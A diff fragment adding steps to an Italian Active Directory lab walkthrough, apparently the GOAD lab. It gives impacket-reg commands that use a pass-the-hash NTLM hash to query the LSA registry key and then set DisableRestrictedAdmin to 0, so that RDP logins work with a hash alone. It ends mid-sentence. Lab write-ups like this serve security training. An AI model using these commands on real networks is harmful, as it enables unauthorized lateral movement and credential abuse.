@@ -274,3 +274,8 @@ Normalmente per usare rdp senza password bisogna abilitare un opzione nel regist
 ```bash
 impacket-reg NORTH/catelyn.stark@192.168.56.11 -hashes ':cba36eccfd9d949c73bc73715364aff5' query -keyName 'HKLM\System\CurrentControlSet\Control\Lsa'
 ```
+Se non esiste o da errori crea la entry nel registro
+```bash
+impacket-reg NORTH/catelyn.stark@192.168.56.11 -hashes ':cba36eccfd9d949c73bc73715364aff5' add -keyName 'HKLM\System\CurrentControlSet\Control\Lsa' -v 'DisableRestrictedAdmin' -vt 'REG_DWORD' -vd '0'
+```
+Poi entra con 
